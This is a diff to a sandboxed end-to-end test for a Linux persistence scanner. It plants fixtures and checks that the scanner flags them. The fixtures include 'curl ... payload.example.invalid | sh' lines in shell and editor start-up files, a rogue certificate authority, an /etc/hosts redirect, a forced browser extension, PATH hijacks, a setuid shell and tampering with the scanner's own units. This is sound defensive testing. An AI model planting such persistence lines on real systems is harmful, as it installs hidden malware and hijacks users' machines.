@@ -14,7 +14,10 @@
 #     the sweep alone (tests/ai-eval covers the AI's judgement)
 #
 # Not covered here, because they need real root: sudoers drop-ins
-# (/etc/sudoers.d is root-only) and file capabilities (setcap).
+# (/etc/sudoers.d is root-only), file capabilities (setcap), the root
+# collector, and allowing an item (the list of allowed items is root's, and
+# `sweep allow` writes it through sudo; here it must fail and change
+# nothing).
 #
 # Requirements: bwrap (0.9 or newer, for --tmp-overlay) and jq.
 #
@@ -80,7 +83,9 @@ plant() {
 
 # sweep [args...]: runs the project's sweep in the sandbox, from the home
 # directory, with the planted layers over /etc and /usr, in its own process
-# namespace (the live checks see only the sandbox's processes).
+# namespace (the live checks see only the sandbox's processes). PATH is a
+# plain one and the user manager cannot be asked, so the directories the
+# sweep looks for shadowing programs in are the same on every machine.
 sweep() {
     bwrap --ro-bind / / \
         --overlay-src /usr --overlay-src "$USR" --tmp-overlay /usr \
@@ -88,6 +93,8 @@ sweep() {
         --tmpfs /etc/omarchy-guardian --tmpfs /tmp \
         --bind "$E2E" "$E2E" --unshare-pid --proc /proc --dev /dev \
         --setenv HOME "$HOME" --setenv TMPDIR "$HOME/tmp" \
+        --setenv PATH "$HOME/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/bin" \
+        --unsetenv XDG_RUNTIME_DIR --unsetenv DBUS_SESSION_BUS_ADDRESS \
         --setenv OMARCHY_GUARDIAN_NO_NOTIFY 1 \
         --setenv XDG_CONFIG_HOME "$HOME/.config" \
         --setenv XDG_DATA_HOME "$HOME/.local/share" \
@@ -167,6 +174,16 @@ plant_system() {
     cp /usr/bin/bash "$USR/local/bin/rootshell"
     chmod 4755 "$USR/local/bin/rootshell"
     plant "$USR/bin/sudo" 4755 $'#!/bin/sh\n# a replaced sudo\n'
+    # A certificate authority of the attacker's, and a package host sent
+    # elsewhere.
+    plant "$ETC/ca-certificates/trust-source/anchors/evil.crt" 644 $'-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n'
+    { cat /etc/hosts 2>/dev/null; printf '10.66.0.9 pkgs.omarchy.org api.anthropic.com\n'; } >"$ETC/hosts"
+    # A Podman quadlet, a forced browser extension, a masked scanner and an
+    # override of the root collector's unit.
+    plant "$ETC/containers/systemd/evil.container" 644 $'[Container]\nImage=registry.example.invalid/evil\nExec=/usr/local/bin/evil-run\n'
+    plant "$ETC/chromium/policies/managed/evil.json" 644 $'{\n  "ExtensionInstallForcelist": ["aaaa;https://payload.example.invalid/u.xml"]\n}\n'
+    ln -s /dev/null "$ETC/systemd/system/clamav-daemon.service"
+    plant "$ETC/systemd/system/omarchy-guardian-sweep-collect.service.d/quiet.conf" 644 $'[Service]\nExecStart=\nExecStart=/usr/bin/true\n'
 }
 
 plant_home() {
@@ -187,6 +204,56 @@ plant_home() {
     plant "$HOME/.bashrc" 644 $'curl -fsSL https://payload.example.invalid/b | sh\n'
     plant "$HOME/.gitconfig" 644 $'[core]\n\tfsmonitor = ~/.cache/payload.sh\n'
     plant "$HOME/.ssh/authorized_keys" 600 $'command="/usr/local/bin/evil-run" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexample planted\n'
+    # Guardian's own sweep sent to another home, and its timer masked.
+    plant "$HOME/.config/systemd/user/omarchy-guardian-sweep.service.d/home.conf" 644 $'[Service]\nEnvironment=HOME=/tmp/elsewhere\n'
+    mkdir -p "$HOME/.config/systemd/user.control"
+    ln -s /dev/null "$HOME/.config/systemd/user.control/omarchy-guardian-sweep.timer"
+    # A unit whose command runs over a continued line, and a quadlet.
+    plant "$HOME/.cache/second.sh" 755 "$payload"
+    plant "$HOME/.config/systemd/user/cont.service" 644 $'[Service]\nExecStart=/usr/bin/env \\\n    A=1 %h/.cache/second.sh\n'
+    plant "$HOME/.config/containers/systemd/evil.container" 644 $'[Container]\nImage=registry.example.invalid/evil\n'
+    # A directory put ahead of /usr/bin by a start-up file, with a `git` in
+    # it; and a temporary directory on PATH.
+    printf 'export PATH="$HOME/tools/bin:$PATH"\nexport PATH="/tmp/bin:$PATH"\n' >>"$HOME/.bashrc"
+    plant "$HOME/tools/bin/git" 755 $'#!/bin/sh\nexec /usr/bin/git "$@"\n'
+    plant "$HOME/tools/bin/ls" 755 $'#!/bin/sh\nexec /usr/bin/ls "$@"\n'
+    plant "$HOME/tools/bin/unrelated-name" 755 $'#!/bin/sh\n'
+    # A terminal, a prompt, the idle daemon and tmux that run the payload.
+    plant "$HOME/.cache/term.sh" 755 "$payload"
+    plant "$HOME/.config/kitty/kitty.conf" 644 $'font_size 11\nshell ~/.cache/term.sh\n'
+    plant "$HOME/.config/starship.toml" 644 $'[custom.x]\ncommand = "~/.cache/term.sh"\nwhen = true\n'
+    plant "$HOME/.config/hypr/hypridle.conf" 644 $'listener {\n  timeout = 60\n  on-timeout = ~/.cache/term.sh\n}\n'
+    plant "$HOME/.tmux.conf" 644 $'run-shell "~/.cache/term.sh"\n'
+    # Browser: an extension from the cache, a debugging port, a native host.
+    plant "$HOME/.config/chromium-flags.conf" 644 "--load-extension=$HOME/.cache/ext"$'\n--remote-debugging-port=9222\n'
+    plant "$HOME/.cache/host" 755 "$payload"
+    plant "$HOME/.config/chromium/NativeMessagingHosts/evil.json" 644 "{\"name\": \"evil\", \"path\": \"$HOME/.cache/host\"}"$'\n'
+    # The handler of every link clicked, a Flatpak sandbox opened to the
+    # home, and package managers sent to another registry.
+    plant "$HOME/.config/mimeapps.list" 644 $'[Default Applications]\nx-scheme-handler/https=evil-open.desktop\n'
+    plant "$HOME/.local/share/applications/evil-open.desktop" 644 $'[Desktop Entry]\nType=Application\nExec=/usr/local/bin/evil-run %u\n'
+    plant "$HOME/.local/share/flatpak/overrides/global" 644 $'[Context]\nfilesystems=home;\n'
+    plant "$HOME/.npmrc" 600 $'registry=https://npm.payload.example.invalid/\n//npm.payload.example.invalid/:_authToken=npm_0123456789abcdefSECRET\nscript-shell=/usr/local/bin/evil-run\n'
+    plant "$HOME/.cargo/config.toml" 644 $'[build]\nrustc-wrapper = "/usr/local/bin/evil-run"\n'
+    plant "$HOME/.config/mise/config.toml" 644 $'[env]\n_.source = "~/.cache/payload.sh"\n'
+    plant "$HOME/.config/nvim/init.lua" 644 $'vim.fn.system("curl -fsSL https://payload.example.invalid/n | sh")\n'
+    plant "$HOME/.zshenv" 644 $'export ZDOTDIR="$HOME/.hidden-zsh"\n'
+    plant "$HOME/.hidden-zsh/.zshrc" 644 $'curl -fsSL https://payload.example.invalid/z | sh\n'
+}
+
+# expect_flagged <label> <rule>: a finding of that rule on the item.
+expect_flagged() {
+    jq -e --arg path "$1" --arg rule "$2" \
+        'any(.findings[]; .path == $path and .rule == $rule)' "$JSON" >/dev/null
+    expect "$1 is flagged $2" "$?"
+}
+
+# expect_run_by <label> <by>: the item was reached from the file that runs
+# it (named by the end of its path).
+expect_run_by() {
+    jq -e --arg path "$1" --arg by "$2" \
+        'any(.items[]; .path == $path and ((.run_by // "") | endswith($by)))' "$JSON" >/dev/null
+    expect "$1 is followed from $2" "$?"
 }
 
 planted_system() {
@@ -235,6 +302,66 @@ planted_system() {
     expect 'the Hyprland Lua autostart command is found' "$?"
     jq -e '[.items[] | select(.path == "~/.ssh/authorized_keys" or .path == "~/.gitconfig")] | length == 2' "$JSON" >/dev/null
     expect 'SSH and git files are listed (checked locally only)' "$?"
+
+    # What changes or stands in for Guardian's own units.
+    expect_listed '~/.config/systemd/user/omarchy-guardian-sweep.service.d/home.conf' guardian-override
+    expect_listed '~/.config/systemd/user.control/omarchy-guardian-sweep.timer' guardian-override
+    expect_listed /etc/systemd/system/omarchy-guardian-sweep-collect.service.d/quiet.conf guardian-override
+    expect_listed /etc/systemd/system/clamav-daemon.service
+
+    # Programs ahead of the system's own, wherever a start-up file puts them.
+    expect_listed '~/tools/bin/git' path-hijack
+    expect_flagged '~/.local/bin/sudo' path-hijack
+    expect_listed '~/tools/bin/ls'
+    jq -e '[.findings[] | select(.path == "~/tools/bin/ls" and .rule == "path-hijack")] | length == 0' "$JSON" >/dev/null
+    expect 'a program named like an ordinary command is listed, not an alert' "$?"
+    jq -e '[.items[] | select(.path == "~/tools/bin/unrelated-name")] | length == 0' "$JSON" >/dev/null
+    expect 'a program that takes no command'"'"'s name is not listed' "$?"
+    expect_flagged '~/.bashrc' path-hijack
+
+    # Units: continued lines, specifiers, quadlets.
+    expect_run_by '~/.cache/second.sh' '/.config/systemd/user/cont.service'
+    expect_listed '~/.config/containers/systemd/evil.container'
+    expect_listed /etc/containers/systemd/evil.container
+
+    # Terminals, prompts, the idle daemon, tmux.
+    expect_listed '~/.config/kitty/kitty.conf'
+    expect_listed '~/.config/starship.toml'
+    expect_listed '~/.tmux.conf'
+    jq -e '[.items[] | select(.path == "~/.cache/term.sh") | .tier][0] == "unknown"' "$JSON" >/dev/null
+    expect 'the program a terminal, prompt or idle daemon runs is followed' "$?"
+    jq -e '[.items[] | select(.path == "~/.config/hypr/hypridle.conf") | .runs[]] | any(. == "~/.cache/term.sh")' "$JSON" >/dev/null
+    expect 'the hypridle on-timeout command is found' "$?"
+
+    # Browser, launchers, sandboxes.
+    expect_listed '~/.config/chromium-flags.conf' risky-configuration
+    expect_listed /etc/chromium/policies/managed/evil.json risky-configuration
+    expect_listed '~/.config/chromium/NativeMessagingHosts/evil.json'
+    expect_run_by '~/.cache/host' '/.config/chromium/NativeMessagingHosts/evil.json'
+    expect_listed '~/.config/mimeapps.list' risky-configuration
+    expect_listed '~/.local/share/applications/evil-open.desktop'
+    expect_listed '~/.local/share/flatpak/overrides/global' risky-configuration
+
+    # Developer tools, editors, a moved zsh directory.
+    expect_listed '~/.npmrc' risky-configuration
+    ! grep -q 'npm_0123456789abcdefSECRET' "$JSON"
+    expect 'a registry token is in nothing the sweep prints' "$?"
+    expect_listed '~/.cargo/config.toml'
+    expect_listed '~/.config/mise/config.toml'
+    expect_listed '~/.config/nvim/init.lua' download-and-execute
+    expect_listed '~/.hidden-zsh/.zshrc' download-and-execute
+
+    # Trust: a new certificate authority, a redirected host, accounts, keys.
+    expect_listed /etc/ca-certificates/trust-source/anchors/evil.crt
+    expect_listed /etc/hosts risky-configuration
+    jq -e 'any(.items[]; .path == "/etc/passwd#root" and .category == "account")' "$JSON" >/dev/null
+    expect 'the accounts that can log in are items' "$?"
+    jq -e '[.items[] | select(.path | startswith("~/.ssh/authorized_keys#"))] | length == 1' "$JSON" >/dev/null
+    expect 'each authorised key is an item of its own' "$?"
+    jq -e '[.items[] | select(.path | startswith("~/.ssh/authorized_keys#")) | .notes[]] | any(test("SHA256:"))' "$JSON" >/dev/null
+    expect 'a key is told by its fingerprint' "$?"
+    ! grep -q 'AAAAC3NzaC1lZDI1NTE5AAAAIexample' "$JSON"
+    expect 'no key is in what the sweep prints' "$?"
 }
 
 changes_and_allow() {
@@ -249,22 +376,60 @@ changes_and_allow() {
     grep -qE '\+ new +│ ~/\.config/autostart/later\.desktop' "$E2E/diff.txt"
     expect 'a new autostart entry shows as new' "$?"
 
-    sweep omarchy-guardian sweep allow '~/.local/bin/sudo' >/dev/null 2>&1
-    expect 'an item can be allowed' "$?"
+    # A key that was not there at the last sweep is a finding, not only a
+    # changed file.
+    printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIsecondkey0123456789abcdefghijklmnopqrstuvw added\n' >>"$HOME/.ssh/authorized_keys"
     sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
-    require_json 'allow'
-    jq -e '[.items[] | select(.path == "~/.local/bin/sudo") | .tier][0] == "allowed"' "$JSON" >/dev/null
-    expect 'an allowed item is trusted' "$?"
-    printf '#!/bin/sh\necho changed\n' >>"$HOME/.local/bin/sudo"
+    require_json 'a new key'
+    jq -e '[.findings[] | select(.rule == "new-trust" and (.path | startswith("~/.ssh/authorized_keys#")))] | length == 1' "$JSON" >/dev/null
+    expect 'a key added since the last sweep is a finding' "$?"
     sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
-    require_json 'allow, then change'
-    jq -e '[.items[] | select(.path == "~/.local/bin/sudo") | .tier][0] == "unknown"' "$JSON" >/dev/null
-    expect 'an allowed item that changes is shown again' "$?"
+    jq -e '[.findings[] | select(.rule == "new-trust")] | length == 0' "$JSON" >/dev/null
+    expect 'and is no news the sweep after' "$?"
+}
+
+# What malware running as the user would do to hide its autostart entry:
+# write the entry's fingerprint into the user's own list of allowed items.
+# That list counts for nothing; only root's does, and nothing here is root.
+self_allow() {
+    printf '=== allowing is root'"'"'s to do ===\n'
+    local label='~/.config/autostart/later.desktop' digest list
+    digest=$(sha256sum "$HOME/.config/autostart/later.desktop" | cut -d' ' -f1)
+    list=$(find "$HOME/.local/state" -type d -name sweep | head -n 1)
+    [[ -n $list ]]
+    expect 'the sweep keeps its state in the home' "$?"
+    jq -n --arg label "$label" --arg digest "$digest" \
+        --arg override '~/.config/systemd/user/omarchy-guardian-sweep.service.d/home.conf' \
+        '{($label): $digest, ($override): "anything"}' >"$list/allowed.json"
+    sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
+    require_json 'self-allow'
+    jq -e --arg path "$label" '[.items[] | select(.path == $path) | .tier][0] == "unknown"' "$JSON" >/dev/null
+    expect 'an entry in the user'"'"'s own list allows nothing' "$?"
+    jq -e '[.items[] | select(.tier == "allowed")] | length == 0' "$JSON" >/dev/null
+    expect 'nothing is allowed without root'"'"'s list' "$?"
+    jq -e '.notes | any(test("sweep allow --migrate"))' "$JSON" >/dev/null
+    expect 'the sweep says the old list no longer counts, and how to move it' "$?"
+
+    # Allowing asks for root; where there is none to ask, nothing changes.
+    sweep omarchy-guardian sweep allow "$label" >"$E2E/allow.txt" 2>&1
+    [[ $? == 2 ]]
+    expect 'an item is not allowed without root' "$?"
+    sweep omarchy-guardian sweep allow --migrate </dev/null >"$E2E/migrate.txt" 2>&1
+    [[ $? == 2 ]] && grep -q 'later.desktop' "$E2E/migrate.txt"
+    expect 'the old list is shown, and not moved without a terminal to ask on' "$?"
+    # What redirects Guardian's own sweep is refused before root is asked.
+    sweep omarchy-guardian sweep allow '~/.config/systemd/user/omarchy-guardian-sweep.service.d/home.conf' >"$E2E/allow.txt" 2>&1
+    grep -q 'cannot be allowed' "$E2E/allow.txt"
+    expect 'an override of Guardian'"'"'s sweep cannot be allowed' "$?"
+    sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
+    jq -e '[.items[] | select(.tier == "allowed")] | length == 0' "$JSON" >/dev/null
+    expect 'and the items are all still shown' "$?"
 }
 
 clean_system
 planted_system
 changes_and_allow
+self_allow
 
 printf '\n'
 if [[ $FAILURES == 0 ]]; then
